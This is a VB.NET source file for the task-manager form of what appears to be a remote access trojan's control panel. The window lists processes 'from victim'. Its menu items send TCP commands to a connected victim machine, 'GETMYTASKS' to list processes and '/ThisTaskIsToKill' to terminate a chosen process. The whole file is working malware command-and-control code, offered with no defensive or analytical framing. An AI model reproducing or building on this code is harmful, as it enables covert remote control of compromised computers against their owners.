Imports System.Net.Sockets
Imports System.Text

Public Class TaskForm
    Public lk As String
    Private Sub TaskForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        '   Dim jk As Process() = Process.GetProcesses
        '  For Each h In jk
        '  Dim lvi As New ListViewItem(h.ProcessName) 'first column

        '  lvi.SubItems.Add(h.Id) 'column 2

        'lvi.SubItems.Add(h.BasePriority)

        'ListView1.Items.Add(lvi) 'add all in listview
        '     ListView1.Items.Add(h.ProcessName).SubItems.Add(h.Id)
        '  Next
        'ListView1.Sorting = SortOrder.Ascending
    End Sub

    Private Sub KillToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem.Click
        Dim ThetAskTokill As String = Label1.Text.Replace("Tasks from victim : ", "")


        Dim TheTask As String = ListView1.SelectedItems(0).Text


        Dim AllToSend As String = TheTask & "/ThisTaskIsToKill"


        Dim Buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)

        For Each client As TcpClient In Form1.LesClients

            If ThetAskTokill = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(Buffer, 0, Buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click

        Dim ThetAskTokill As String = Label1.Text.Replace("Tasks from victim : ", "")
        Dim allstr As String = "GETMYTASKS"

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)

        lk = ThetAskTokill



            For Each client As TcpClient In Form1.LesClients

            If lk = client.Client.RemoteEndPoint.ToString Then
                '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next

    End Sub
End Class